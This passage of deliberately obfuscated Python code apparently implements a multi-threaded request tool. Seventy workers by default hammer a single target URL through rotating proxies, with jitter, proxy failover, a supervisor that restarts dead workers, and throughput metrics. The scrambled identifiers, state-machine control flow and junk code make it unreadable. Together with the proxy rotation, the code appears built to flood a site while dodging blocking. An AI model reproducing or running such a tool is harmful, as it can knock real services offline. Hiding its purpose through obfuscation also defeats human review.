                if llIlIlIllIIIIllllIIlIll == 2421957:
                    llIIlllIllllIlI = sum(lllIlIlllIIlIIll) + lIIlIIIIIlIIlI % 69 - llllIlIlIllIIIlIllll
                    break
                if llIlIlIllIIIIllllIIlIll == 6146160:
                    lllIlIlllIIlIIll = [lIIlIIIIIlIIlI >> 12 & 255 for lIllllIlIlIlIllll in range(5)]
                    llIlIlIllIIIIllllIIlIll = 2421957
                    continue
                if llIlIlIllIIIIllllIIlIll == 1045148:
                    lIIlIIIIIlIIlI = (llllIlIlIllIIIlIllll * 5 ^ 9965001) & 65535
                    llIlIlIllIIIIllllIIlIll = 6146160
                    continue
        with getattr(self, 'lock'):
            lllIIllIIIlIIIIlIIIlI = 4302890
            while True:
                if lllIIllIIIlIIIIlIIIlI == 8810761:
                    if category == 'SUCCESS':
                        self.successful_requests += 1
                        if latency_ms is not None:
                            getattr(getattr(self, 'latencies'), 'append')(latency_ms)
                            if len(getattr(self, 'latencies')) > 1000:
                                getattr(getattr(self, 'latencies'), 'pop')(0)
                    else:
                        self.failed_requests += 1
                    lllIIllIIIlIIIIlIIIlI = 7581052
                    continue
                if lllIIllIIIlIIIIlIIIlI == 4302890:
                    self.total_requests += 1
                    lllIIllIIIlIIIIlIIIlI = 8810761
                    continue
                if lllIIllIIIlIIIIlIIIlI == 1749201:
                    if status_code:
                        if 400 <= status_code < 500:
                            self.http_4xx += 1
                        elif 500 <= status_code < 600:
                            self.http_5xx += 1
                    break
                if lllIIllIIIlIIIIlIIIlI == 1681418:
                    lllIIllIIIlIIIIlIIIlI = 8810761
                    continue
                if lllIIllIIIlIIIIlIIIlI == 7581052:
                    if category == 'TIMEOUT':
                        self.timeouts += 1
                    elif category == 'NETWORK_CONNECT' or category == 'NETWORK_RESET':
                        self.connection_errors += 1
                    elif category == 'PROXY_FAILURE':
                        self.proxy_errors += 1
                    lllIIllIIIlIIIIlIIIlI = 1749201
                    continue
                if lllIIllIIIlIIIIlIIIlI == 2488500:
                    lllIIllIIIlIIIIlIIIlI = 1681418
                    continue

    def record_rotation(self):
        if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][0] == 254:
            IIlIIllIIlIlllIllIIII = 2909823
            while True:
                if IIlIIllIIlIlllIllIIII == 7818889:
                    llIllIllIlllllllI = sum(IIIllIIllllIlll) + lllIIlIlIlllllIlIll % 68 - llIIllIllllIIllIIllIlIll
                    break
                if IIlIIllIIlIlllIllIIII == 2219874:
                    IIIllIIllllIlll = [lllIIlIlIlllllIlIll >> 4 & 255 for lIllIlIIIllIlllIIllI in range(4)]
                    IIlIIllIIlIlllIllIIII = 7818889
                    continue
                if IIlIIllIIlIlllIllIIII == 8840822:
                    IIlIIllIIlIlllIllIIII = 6068139
                    continue
                if IIlIIllIIlIlllIllIIII == 9558075:
                    IIlIIllIIlIlllIllIIII = 6068139
                    continue
                if IIlIIllIIlIlllIllIIII == 7232475:
                    IIlIIllIIlIlllIllIIII = 8840822
                    continue
                if IIlIIllIIlIlllIllIIII == 2909823:
                    llIIllIllllIIllIIllIlIll = 58105763
                    IIlIIllIIlIlllIllIIII = 6068139
                    continue
                if IIlIIllIIlIlllIllIIII == 6068139:
                    lllIIlIlIlllllIlIll = (llIIllIllllIIllIIllIlIll * 4 ^ 6626830) & 4294967295
                    IIlIIllIIlIlllIllIIII = 2219874
                    continue
        with getattr(self, 'lock'):
            self.proxy_rotations += 1

    def record_worker_restart(self):
        with getattr(self, 'lock'):
            self.worker_restarts += 1

    def set_active_workers(self, count):
        with getattr(self, 'lock'):
            setattr(self, 'active_workers', count)

    def get_metrics(self, healthy_count=0, unhealthy_count=0):
        if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][7] ^ 39 == 358:
            lllIIIIllIIIIlIlllIII = 8494229
            while True:
                if lllIIIIllIIIIlIlllIII == 4513554:
                    lllIIIIllIIIIlIlllIII = 4513554
                    continue
                if lllIIIIllIIIIlIlllIII == 8494229:
                    llllIIlIllIIlIIIIIlI = 96851897
                    lllIIIIllIIIIlIlllIII = 1423508
                    continue
                if lllIIIIllIIIIlIlllIII == 4521476:
                    lllIIIIllIIIIlIlllIII = 1423508
                    continue
                if lllIIIIllIIIIlIlllIII == 2346752:
                    IIllIllIIIIIllllIIIlIl = sum(IIlIlllllIlIIIllllll) + lllllllIllIIlIIlIIIlI % 24 - llllIIlIllIIlIIIIIlI
                    break
                if lllIIIIllIIIIlIlllIII == 1423508:
                    lllllllIllIIlIIlIIIlI = (llllIIlIllIIlIIIIIlI * 8 ^ 5331608) & 16777215
                    lllIIIIllIIIIlIlllIII = 7381469
                    continue
                if lllIIIIllIIIIlIlllIII == 7381469:
                    IIlIlllllIlIIIllllll = [lllllllIllIIlIIlIIIlI >> 5 & 255 for IIlIIIIIIIIlllI in range(8)]
                    lllIIIIllIIIIlIlllIII = 2346752
                    continue
        with getattr(self, 'lock'):
            IlIlllIllIIllllIlll = 2201220
            while True:
                if IlIlllIllIIllllIlll == 4545037:
                    IlIIIlllllllIII = getattr(self, 'total_requests') / IlllIIIIIIlIll
                    IlIlllIllIIllllIlll = 6595551
                    continue
                if IlIlllIllIIllllIlll == 2201220:
                    IlllIIIIIIlIll = max(getattr(IlllllIIllIIllIIll, 'time')() - getattr(self, 'start_time'), 0.001)
                    IlIlllIllIIllllIlll = 4545037
                    continue
                if IlIlllIllIIllllIlll == 9325932:
                    llIllIllIlIlllIIlllIII = min(getattr(self, 'latencies')) if getattr(self, 'latencies') else 0.0
                    IlIlllIllIIllllIlll = 7779678
                    continue
                if IlIlllIllIIllllIlll == 6703196:
                    IlIlllIllIIllllIlll = 9325932
                    continue
                if IlIlllIllIIllllIlll == 8088476:
                    return {'workers': getattr(self, 'active_workers'), 'active_workers': getattr(self, 'active_workers'), 'healthy_proxies': healthy_count, 'unhealthy_proxies': unhealthy_count, 'requests': getattr(self, 'total_requests'), 'success': getattr(self, 'successful_requests'), 'failed': getattr(self, 'failed_requests'), 'timeouts': getattr(self, 'timeouts'), 'connection_errors': getattr(self, 'connection_errors'), 'proxy_errors': getattr(self, 'proxy_errors'), 'http_4xx': getattr(self, 'http_4xx'), 'http_5xx': getattr(self, 'http_5xx'), 'average_latency': round(lIlIIIlIllIlIIl, 2), 'min_latency': round(llIllIllIlIlllIIlllIII, 2), 'max_latency': round(IIIIllIIlIlIlllll, 2), 'requests_per_second': round(IlIIIlllllllIII, 2), 'proxy_rotations': getattr(self, 'proxy_rotations'), 'worker_restarts': getattr(self, 'worker_restarts')}
                    break
                if IlIlllIllIIllllIlll == 2442413:
                    IlIlllIllIIllllIlll = 9325932
                    continue
                if IlIlllIllIIllllIlll == 7779678:
                    IIIIllIIlIlIlllll = max(getattr(self, 'latencies')) if getattr(self, 'latencies') else 0.0
                    IlIlllIllIIllllIlll = 8088476
                    continue
                if IlIlllIllIIllllIlll == 6595551:
                    lIlIIIlIllIlIIl = sum(getattr(self, 'latencies')) / len(getattr(self, 'latencies')) if getattr(self, 'latencies') else 0.0
                    IlIlllIllIIllllIlll = 9325932
                    continue

class lIIIIlIllIIllIIIIIll:

    def __init__(self, target_url, test_config=None):
        llIIlIIIlIlIIIlIIIlIlll = 1902870
        while True:
            if llIIlIIIlIlIIIlIIIlIlll == 5055645:
                setattr(self, 'config', test_config or lllllIIlIIIllIIIllII)
                llIIlIIIlIlIIIlIIIlIlll = 6719123
                continue
            if llIIlIIIlIlIIIlIIIlIlll == 7355738:
                setattr(self, 'supervisor', None)
                break
            if llIIlIIIlIlIIIlIIIlIlll == 1323425:
                setattr(self, 'metrics', IIIIIlIIIlIlIIIllIII())
                llIIlIIIlIlIIIlIIIlIlll = 7355738
                continue
            if llIIlIIIlIlIIIlIIIlIlll == 9000216:
                llIIlIIIlIlIIIlIIIlIlll = 5806722
                continue
            if llIIlIIIlIlIIIlIIIlIlll == 6719123:
                setattr(self, 'stop_event', getattr(IlIlIllllIlllIIIIll, 'Event')())
                llIIlIIIlIlIIIlIIIlIlll = 5873604
                continue
            if llIIlIIIlIlIIIlIIIlIlll == 4888343:
                setattr(self, 'pool', IlIIlllIllIIlllIIlll(getattr(self, 'provider'), IllIIIllIIIIlIIIIIlIIII))
                llIIlIIIlIlIIIlIIIlIlll = 2281494
                continue
            if llIIlIIIlIlIIIlIIIlIlll == 5806722:
                llIIlIIIlIlIIIlIIIlIlll = 8800645
                continue
            if llIIlIIIlIlIIIlIIIlIlll == 5873604:
                setattr(self, 'provider', IlllIIlIlIIllll(IllIIIllIIIIlIIIIIlIIII))
                llIIlIIIlIlIIIlIIIlIlll = 4888343
                continue
            if llIIlIIIlIlIIIlIIIlIlll == 8800645:
                llIIlIIIlIlIIIlIIIlIlll = 5873604
                continue
            if llIIlIIIlIlIIIlIIIlIlll == 1902870:
                if 11990 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][20] == 12134:
                    lllIIlIlllllIl = 4670109
                    while True:
                        if lllIIlIlllllIl == 5937424:
                            IlIIIlIIIIIlIlIlIlIIIlII = sum(llIIlllIIIlIlllIllllIlII) + IlllllIIllIIlIlll % 68 - lIlIIlllllllIlIIIllI
                            break
                        if lllIIlIlllllIl == 7901470:
                            llIIlllIIIlIlllIllllIlII = [IlllllIIllIIlIlll >> 7 & 255 for IIIIllIlIlllIIIIlIl in range(6)]
                            lllIIlIlllllIl = 5937424
                            continue
                        if lllIIlIlllllIl == 8206712:
                            lllIIlIlllllIl = 5937424
                            continue
                        if lllIIlIlllllIl == 6463701:
                            IlllllIIllIIlIlll = (lIlIIlllllllIlIIIllI * 6 ^ 7754870) & 16777215
                            lllIIlIlllllIl = 7901470
                            continue
                        if lllIIlIlllllIl == 4670109:
                            lIlIIlllllllIlIIIllI = 16727025 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][19]
                            lllIIlIlllllIl = 6463701
                            continue
                llIIlIIIlIlIIIlIIIlIlll = 5994023
                continue
            if llIIlIIIlIlIIIlIIIlIlll == 2281494:
                setattr(self, 'scheduler', lllIIIIlIllIIlI(getattr(self, 'pool'), getattr(getattr(self, 'config'), 'get')('allocation_strategy', 'round_robin')))
                llIIlIIIlIlIIIlIIIlIlll = 1323425
                continue
            if llIIlIIIlIlIIIlIIIlIlll == 5994023:
                setattr(self, 'target_url', target_url)
                llIIlIIIlIlIIIlIIIlIlll = 5055645
                continue

    def mask_proxy(self, url):
        llllIIlllIIllIIlIIlIIlll = 1065242
        while True:
            if llllIIlllIIllIIlIIlIIlll == 2886981:
                llllIIlllIIllIIlIIlIIlll = 1428464
                continue
            if llllIIlllIIllIIlIIlIIlll == 1891677:
                llllIIlllIIllIIlIIlIIlll = 1891677
                continue
            if llllIIlllIIllIIlIIlIIlll == 2134128:
                if not url:
                    return 'DIRECT'
                llllIIlllIIllIIlIIlIIlll = 1887694
                continue
            if llllIIlllIIllIIlIIlIIlll == 1887694:
                try:
                    p = getattr(getattr(urllib, 'parse'), 'urlparse')(url)
                    if getattr(p, 'username') and getattr(p, 'password'):
                        return getattr(url, 'replace')(f'{getattr(p, 'username')}:{getattr(p, 'password')}', '***:***')
                except Exception:
                    pass
                llllIIlllIIllIIlIIlIIlll = 1428464
                continue
            if llllIIlllIIllIIlIIlIIlll == 1428464:
                return url
                break
            if llllIIlllIIllIIlIIlIIlll == 1065242:
                llllIIlllIIllIIlIIlIIlll = 2134128
                continue
            if llllIIlllIIllIIlIIlIIlll == 5677030:
                llllIIlllIIllIIlIIlIIlll = 5677030
                continue

    def classify_error(self, exc):
        IIlIlIllIIllIllIlIllllll = 7098788
        while True:
            if IIlIlIllIIllIllIlIllllll == 6511784:
                if isinstance(exc, getattr(getattr(requests, 'exceptions'), 'ConnectTimeout')):
                    return 'TIMEOUT'
                elif isinstance(exc, getattr(getattr(requests, 'exceptions'), 'ReadTimeout')):
                    return 'TIMEOUT'
                elif isinstance(exc, getattr(getattr(requests, 'exceptions'), 'ProxyError')):
                    return 'PROXY_FAILURE'
                elif isinstance(exc, getattr(getattr(requests, 'exceptions'), 'ConnectionError')):
                    return 'NETWORK_RESET'
                elif isinstance(exc, getattr(getattr(requests, 'exceptions'), 'RequestException')):
                    return 'NETWORK_CONNECT'
                IIlIlIllIIllIllIlIllllll = 4197679
                continue
            if IIlIlIllIIllIllIlIllllll == 6823826:
                IIlIlIllIIllIllIlIllllll = 7528784
                continue
            if IIlIlIllIIllIllIlIllllll == 4197679:
                return 'UNKNOWN'
                break
            if IIlIlIllIIllIllIlIllllll == 7528784:
                IIlIlIllIIllIllIlIllllll = 7098788
                continue
            if IIlIlIllIIllIllIlIllllll == 4714816:
                IIlIlIllIIllIllIlIllllll = 6511784
                continue
            if IIlIlIllIIllIllIlIllllll == 7098788:
                IIlIlIllIIllIllIlIllllll = 6511784
                continue

    def worker_loop(self, worker_id):
        lllIlIIIllllIlIIlIIl = 6209157
        while True:
            if lllIlIIIllllIlIIlIIl == 7790900:
                getattr(session, 'mount')('https://', llIllIllIIlIlll)
                lllIlIIIllllIlIIlIIl = 5968154
                continue
            if lllIlIIIllllIlIIlIIl == 3640037:
                session = getattr(requests, 'Session')()
                lllIlIIIllllIlIIlIIl = 1494068
                continue
            if lllIlIIIllllIlIIlIIl == 8147211:
                while not getattr(getattr(self, 'stop_event'), 'is_set')():
                    IlllIIIllIlllllIlIIll = getattr(getattr(self, 'scheduler'), 'get_proxy_for_worker')(worker_id)
                    if IlllIIIllIlllllIlIIll != IlIlIllIIIIllIIllII and IlllIIIllIlllllIlIIll is not None:
                        getattr(getattr(self, 'metrics'), 'record_rotation')()
                        IlIlIllIIIIllIIllII = IlllIIIllIlllllIlIIll
                    if IlllIIIllIlllllIlIIll is None:
                        print(f'[RESILIENCE] worker={worker_id} event=NO_HEALTHY_PROXY')
                        getattr(IlllllIIllIIllIIll, 'sleep')(1.0)
                        continue
                    proxies = {'http': IlllIIIllIlllllIlIIll, 'https': IlllIIIllIlllllIlIIll}
                    IIIlIIIIlIIIIlIlIIIll = getattr(IlllllIIllIIllIIll, 'time')()
                    try:
                        lllIIlllIIlllIlIl = 2083781
                        while True:
                            if lllIIlllIIlllIlIl == 5553426:
                                lllIIlllIIlllIlIl = 2083781
                                continue
                            if lllIIlllIIlllIlIl == 6078647:
                                if getattr(lIlllIlIllIllllll, 'status_code') == 200:
                                    llllIIlIIIIllIII = 8121857
                                    while True:
                                        if llllIIlIIIIllIII == 2321258:
                                            print(f'[RESILIENCE] worker={worker_id} proxy={getattr(self, 'mask_proxy')(IlllIIIllIlllllIlIIll)} event=REQUEST_SUCCESS latency_ms={int(latency_ms)}')
                                            break
                                        if llllIIlIIIIllIII == 1196864:
                                            llllIIlIIIIllIII = 1885944
                                            continue
                                        if llllIIlIIIIllIII == 1885944:
                                            getattr(getattr(self, 'metrics'), 'record_request')('SUCCESS', latency_ms=latency_ms, status_code=getattr(lIlllIlIllIllllll, 'status_code'))
                                            llllIIlIIIIllIII = 2321258
                                            continue
                                        if llllIIlIIIIllIII == 8121857:
                                            getattr(getattr(self, 'pool'), 'mark_proxy_success')(IlllIIIllIlllllIlIIll, latency_ms)
                                            llllIIlIIIIllIII = 1885944
                                            continue
                                elif getattr(lIlllIlIllIllllll, 'status_code') in (408, 429, 500, 502, 503, 504):
                                    lIlIllIIllIlIllIlllIIII = 2470256
                                    while True:
                                        if lIlIllIIllIlIllIlllIIII == 9129487:
                                            getattr(getattr(self, 'pool'), 'mark_proxy_failed')(IlllIIIllIlllllIlIIll, 'HTTP_ERROR')
                                            lIlIllIIllIlIllIlllIIII = 9063698
                                            continue
                                        if lIlIllIIllIlIllIlllIIII == 2470256:
                                            getattr(getattr(self, 'metrics'), 'record_request')('HTTP_5XX' if getattr(lIlllIlIllIllllll, 'status_code') >= 500 else 'HTTP_4XX', status_code=getattr(lIlllIlIllIllllll, 'status_code'))
                                            lIlIllIIllIlIllIlllIIII = 9129487
                                            continue
                                        if lIlIllIIllIlIllIlllIIII == 4827287:
                                            lIlIllIIllIlIllIlllIIII = 9063698
                                            continue
                                        if lIlIllIIllIlIllIlllIIII == 9063698:
                                            print(f'[RESILIENCE] worker={worker_id} proxy={getattr(self, 'mask_proxy')(IlllIIIllIlllllIlIIll)} event=RETRYABLE_HTTP_ERROR status={getattr(lIlllIlIllIllllll, 'status_code')}')
                                            break
                                else:
                                    getattr(getattr(self, 'metrics'), 'record_request')('HTTP_4XX', status_code=getattr(lIlllIlIllIllllll, 'status_code'))
                                    print(f'[RESILIENCE] worker={worker_id} proxy={getattr(self, 'mask_proxy')(IlllIIIllIlllllIlIIll)} event=NON_RETRYABLE_HTTP status={getattr(lIlllIlIllIllllll, 'status_code')}')
                                break
                            if lllIIlllIIlllIlIl == 2937650:
                                latency_ms = (getattr(IlllllIIllIIllIIll, 'time')() - IIIlIIIIlIIIIlIlIIIll) * 1000
                                lllIIlllIIlllIlIl = 6078647
                                continue
                            if lllIIlllIIlllIlIl == 7767859:
                                lllIIlllIIlllIlIl = 5553426
                                continue
                            if lllIIlllIIlllIlIl == 2083781:
                                lIlllIlIllIllllll = getattr(session, 'get')(getattr(self, 'target_url'), proxies=proxies, timeout=getattr(IllIIIllIIIIlIIIIIlIIII, 'get')('proxy_timeout', 5))
                                lllIIlllIIlllIlIl = 2937650
                                continue
                    except Exception as exc:
                        IlIlIlIIllIllIIIlIllI = 1039586
                        while True:
                            if IlIlIlIIllIllIIIlIllI == 1602497:
                                print(f'[RESILIENCE] worker={worker_id} proxy={getattr(self, 'mask_proxy')(IlllIIIllIlllllIlIIll)} event={llIIllllllIlIIlII} exc={getattr(type(exc), '__name__')}')
                                break
                            if IlIlIlIIllIllIIIlIllI == 1115950:
                                IlIlIlIIllIllIIIlIllI = 1039586
                                continue
                            if IlIlIlIIllIllIIIlIllI == 1039586:
                                llIIllllllIlIIlII = getattr(self, 'classify_error')(exc)
                                IlIlIlIIllIllIIIlIllI = 2306942
                                continue
                            if IlIlIlIIllIllIIIlIllI == 2717844:
                                getattr(getattr(self, 'pool'), 'mark_proxy_failed')(IlllIIIllIlllllIlIIll, llIIllllllIlIIlII)
                                IlIlIlIIllIllIIIlIllI = 1602497
                                continue
                            if IlIlIlIIllIllIIIlIllI == 2306942:
                                getattr(getattr(self, 'metrics'), 'record_request')(llIIllllllIlIIlII)
                                IlIlIlIIllIllIIIlIllI = 2717844
                                continue
                            if IlIlIlIIllIllIIIlIllI == 5907128:
                                IlIlIlIIllIllIIIlIllI = 2717844
                                continue
                            if IlIlIlIIllIllIIIlIllI == 5877088:
                                IlIlIlIIllIllIIIlIllI = 2717844
                                continue
                    llIllIllIIlIIlIlIllI = getattr(getattr(self, 'config'), 'get')('request_interval', 0.25)
                    jitter = getattr(IIIllllllIlIlIllIIIIl, 'uniform')(0, getattr(getattr(self, 'config'), 'get')('jitter', 0.1))
                    getattr(IlllllIIllIIllIIll, 'sleep')(max(llIllIllIIlIIlIlIllI + jitter, getattr(getattr(self, 'config'), 'get')('failure_backoff', 0.1)))
                break
            if lllIlIIIllllIlIIlIIl == 5968154:
                IlIlIllIIIIllIIllII = None
                lllIlIIIllllIlIIlIIl = 8147211
                continue
            if lllIlIIIllllIlIIlIIl == 6796279:
                getattr(session, 'mount')('http://', llIllIllIIlIlll)
                lllIlIIIllllIlIIlIIl = 7790900
                continue
            if lllIlIIIllllIlIIlIIl == 1494068:
                llIllIllIIlIlll = getattr(getattr(requests, 'adapters'), 'HTTPAdapter')(pool_connections=20, pool_maxsize=20, max_retries=0)
                lllIlIIIllllIlIIlIIl = 6796279
                continue
            if lllIlIIIllllIlIIlIIl == 6209157:
                if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][15] ^ 210 == 369:
                    IllIIIlIIlIlIllIIll = 5238953
                    while True:
                        if IllIIIlIIlIlIllIIll == 5939460:
                            lIlIIIlIIIIIlIIlIIlll = (lIlIIlIlIlIlllIlIIlIIl * 8 ^ 1360889) & 16777215
                            IllIIIlIIlIlIllIIll = 6651763
                            continue
                        if IllIIIlIIlIlIllIIll == 6651763:
                            lllIlIIIIlIIIIlllllIlIll = [lIlIIIlIIIIIlIIlIIlll >> 9 & 255 for IlIIlllIIllIlIIlIl in range(8)]
                            IllIIIlIIlIlIllIIll = 2850735
                            continue
                        if IllIIIlIIlIlIllIIll == 5238953:
                            lIlIIlIlIlIlllIlIIlIIl = 70287083
                            IllIIIlIIlIlIllIIll = 5939460
                            continue
                        if IllIIIlIIlIlIllIIll == 2850735:
                            lIIlIlIIIIlllIlI = sum(lllIlIIIIlIIIIlllllIlIll) + lIlIIIlIIIIIlIIlIIlll % 19 - lIlIIlIlIlIlllIlIIlIIl
                            break
                        if IllIIIlIIlIlIllIIll == 3530221:
                            IllIIIlIIlIlIllIIll = 5238953
                            continue
                lllIlIIIllllIlIIlIIl = 3640037
                continue
            if lllIlIIIllllIlIIlIIl == 3824601:
                lllIlIIIllllIlIIlIIl = 8147211
                continue
            if lllIlIIIllllIlIIlIIl == 3952117:
                lllIlIIIllllIlIIlIIl = 7790900
                continue

class IIIlIIlIllIlllIIIIlIlI:

    def __init__(self, tester, worker_count=70):
        IIIlIlllIllIlllIlllIII = 5887126
        while True:
            if IIIlIlllIllIlllIlllIII == 9700478:
                setattr(self, 'monitor_thread', None)
                break
            if IIIlIlllIllIlllIlllIII == 5887126:
                if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][5] * 17 + 250 == 3804:
                    lIlIIlIlllIlIlIIlll = 5786672
                    while True:
                        if lIlIIlIlllIlIlIIlll == 5786672:
                            llllllllIlIllIlllI = 49450752 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][16]
                            lIlIIlIlllIlIlIIlll = 8077850
                            continue
                        if lIlIIlIlllIlIlIIlll == 8077850:
                            IlIlIIIIIllIIll = (llllllllIlIllIlllI * 8 ^ 9829182) & 65535
                            lIlIIlIlllIlIlIIlll = 4581876
                            continue
                        if lIlIIlIlllIlIlIIlll == 9488723:
                            lIlIIlIlllIlIlIIlll = 5786672
                            continue
                        if lIlIIlIlllIlIlIIlll == 4581876:
                            IlIlIlIIIIllIIlIl = [IlIlIIIIIllIIll >> 6 & 255 for IlIllIIIllIIIlIIlIIlIl in range(8)]
                            lIlIIlIlllIlIlIIlll = 8369066
                            continue
                        if lIlIIlIlllIlIlIIlll == 6408737:
                            lIlIIlIlllIlIlIIlll = 8077850
                            continue
                        if lIlIIlIlllIlIlIIlll == 8369066:
                            lIIIIllIIIIlIlIllIl = sum(IlIlIlIIIIllIIlIl) + IlIlIIIIIllIIll % 84 - llllllllIlIllIlllI
                            break
                IIIlIlllIllIlllIlllIII = 5826928
                continue
            if IIIlIlllIllIlllIlllIII == 8741383:
                setattr(self, 'workers', {})
                IIIlIlllIllIlllIlllIII = 6407229
                continue
            if IIIlIlllIllIlllIlllIII == 5826928:
                setattr(self, 'tester', tester)
                IIIlIlllIllIlllIlllIII = 2389747
                continue
            if IIIlIlllIllIlllIlllIII == 6407229:
                setattr(self, 'lock', getattr(IlIlIllllIlllIIIIll, 'Lock')())
                IIIlIlllIllIlllIlllIII = 9700478
                continue
            if IIIlIlllIllIlllIlllIII == 9655353:
                IIIlIlllIllIlllIlllIII = 9700478
                continue
            if IIIlIlllIllIlllIlllIII == 2389747:
                setattr(self, 'worker_count', worker_count)
                IIIlIlllIllIlllIlllIII = 8741383
                continue
            if IIIlIlllIllIlllIlllIII == 9926792:
                IIIlIlllIllIlllIlllIII = 2389747
                continue
            if IIIlIlllIllIlllIlllIII == 2534327:
                IIIlIlllIllIlllIlllIII = 8741383
                continue

    def start(self):
        IIlIllIIllIIII = 8709692
        while True:
            if IIlIllIIllIIII == 9405273:
                setattr(self, 'monitor_thread', getattr(IlIlIllllIlllIIIIll, 'Thread')(target=getattr(self, '_supervise_loop'), daemon=True))
                IIlIllIIllIIII = 3436895
                continue
            if IIlIllIIllIIII == 8709692:
                IIlIllIIllIIII = 7652021
                continue
            if IIlIllIIllIIII == 1683575:
                getattr(getattr(getattr(self, 'tester'), 'metrics'), 'set_active_workers')(len(getattr(self, 'workers')))
                IIlIllIIllIIII = 9405273
                continue
            if IIlIllIIllIIII == 3436895:
                getattr(getattr(self, 'monitor_thread'), 'start')()
                break
            if IIlIllIIllIIII == 4706610:
                IIlIllIIllIIII = 6217767
                continue
            if IIlIllIIllIIII == 6217767:
                getattr(getattr(getattr(self, 'tester'), 'pool'), 'refresh_pool')(force=True)
                IIlIllIIllIIII = 6497946
                continue
            if IIlIllIIllIIII == 7652021:
                getattr(getattr(getattr(self, 'tester'), 'metrics'), 'reset')()
                IIlIllIIllIIII = 6217767
                continue
            if IIlIllIIllIIII == 6497946:
                for i in range(getattr(self, 'worker_count')):
                    getattr(self, '_start_worker')(i)
                IIlIllIIllIIII = 1683575
                continue

    def _start_worker(self, worker_id):
        IlllllIIIllIllll = 9345402
        while True:
            if IlllllIIIllIllll == 5801128:
                getattr(self, 'workers')[worker_id] = t
                break
            if IlllllIIIllIllll == 9345402:
                if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][16] ^ 66 == 464:
                    IlIIIlllllIlIlIIIlIl = 6059717
                    while True:
                        if IlIIIlllllIlIlIIIlIl == 3419199:
                            IIIIllIIIIllIIIlIllIl = sum(IlIIIlIlIIlIlI) + llllIIIIlllIIlIII % 17 - IIIlIlllIIlllll
                            break
                        if IlIIIlllllIlIlIIIlIl == 3616225:
                            IlIIIlllllIlIlIIIlIl = 6059717
                            continue
                        if IlIIIlllllIlIlIIIlIl == 9623223:
                            llllIIIIlllIIlIII = (IIIlIlllIIlllll * 2 ^ 14914401) & 65535
                            IlIIIlllllIlIlIIIlIl = 8696743
                            continue
                        if IlIIIlllllIlIlIIIlIl == 6059717:
                            IIIlIlllIIlllll = 140194998 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][1]
                            IlIIIlllllIlIlIIIlIl = 9623223
                            continue
                        if IlIIIlllllIlIlIIIlIl == 8696743:
                            IlIIIlIlIIlIlI = [llllIIIIlllIIlIII >> 9 & 255 for lllIlllllIlIllIIlI in range(2)]
                            IlIIIlllllIlIlIIIlIl = 3419199
                            continue
                IlllllIIIllIllll = 6905797
                continue
            if IlllllIIIllIllll == 7430752:
                IlllllIIIllIllll = 6577549
                continue
            if IlllllIIIllIllll == 6905797:
                t = getattr(IlIlIllllIlllIIIIll, 'Thread')(target=getattr(getattr(self, 'tester'), 'worker_loop'), args=(worker_id,), daemon=True)
                IlllllIIIllIllll = 6577549
                continue
            if IlllllIIIllIllll == 6577549:
                getattr(t, 'start')()
                IlllllIIIllIllll = 5801128
                continue

    def _supervise_loop(self):
        while not getattr(getattr(getattr(self, 'tester'), 'stop_event'), 'is_set')():
            getattr(IlllllIIllIIllIIll, 'sleep')(2.0)
            with getattr(self, 'lock'):
                lIlIIlIIlIIlIIlIllIllI = 2951347
                while True:
                    if lIlIIlIIlIIlIIlIllIllI == 7797515:
                        lIlIIlIIlIIlIIlIllIllI = 2951347
                        continue
                    if lIlIIlIIlIIlIIlIllIllI == 2844812:
                        for wid in IlIIIIlIlllIIIIII:
                            IllIIIlIlIIIIlIlIl = 5330654
                            while True:
                                if IllIIIlIlIIIIlIlIl == 4447507:
                                    getattr(self, '_start_worker')(wid)
                                    break
                                if IllIIIlIlIIIIlIlIl == 7369954:
                                    IllIIIlIlIIIIlIlIl = 4447507
                                    continue
                                if IllIIIlIlIIIIlIlIl == 9271156:
                                    IllIIIlIlIIIIlIlIl = 7623179
                                    continue
                                if IllIIIlIlIIIIlIlIl == 7623179:
                                    getattr(getattr(getattr(self, 'tester'), 'metrics'), 'record_worker_restart')()
                                    IllIIIlIlIIIIlIlIl = 4447507
                                    continue
                                if IllIIIlIlIIIIlIlIl == 5330654:
                                    print(f'[SUPERVISOR] Worker {wid} terminated unexpectedly. Restarting worker...')
                                    IllIIIlIlIIIIlIlIl = 7623179
                                    continue
                        lIlIIlIIlIIlIIlIllIllI = 4049609
                        continue
                    if lIlIIlIIlIIlIIlIllIllI == 2951347:
                        IlIIIIlIlllIIIIII = [wid for wid, t in getattr(getattr(self, 'workers'), 'items')() if not getattr(t, 'is_alive')()]
                        lIlIIlIIlIIlIIlIllIllI = 2844812
                        continue
                    if lIlIIlIIlIIlIIlIllIllI == 4114091:
                        lIlIIlIIlIIlIIlIllIllI = 2844812
                        continue
                    if lIlIIlIIlIIlIIlIllIllI == 4049609:
                        getattr(getattr(getattr(self, 'tester'), 'metrics'), 'set_active_workers')(len(getattr(self, 'workers')))
                        break

    def stop(self):
        IlllllIlIIlIIIIll = 4723918
        while True:
            if IlllllIlIIlIIIIll == 9472092:
